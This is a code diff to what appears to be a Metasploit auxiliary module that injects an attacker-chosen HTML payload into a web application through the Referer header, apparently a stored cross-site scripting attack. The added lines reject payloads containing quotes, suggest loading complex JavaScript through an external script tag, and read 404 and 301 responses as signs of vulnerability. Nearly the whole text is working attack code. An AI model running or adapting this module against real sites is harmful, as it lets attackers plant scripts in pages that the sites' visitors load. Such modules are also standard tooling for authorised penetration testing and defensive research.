@@ -53,12 +53,25 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    send_request_cgi({
+
+   if datastore['HTML'] =~ /'/ or datastore['HTML'] =~ /"/
+      print_bad("HTML payload can't contain single- or double-quotes. Reference complex javascript with a simple <script src=http://xxx/foo.js></script> payload instead.")
+      return
+   end
+
+    res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'index.php', Rex::Text.rand_text_alpha(10)),
       'headers' => {
         'Referer' => datastore['HTML']
       }
     })
+
+    if res && res.code == 404
+      print_bad("404 returned. This means the instance is likely not vulnerable.")
+    elsif res && res.code == 301
+      print_good("301 returned! The host is potentially vulnerable and the payload was successfully sent.")
+    end
+
   end
 end
 
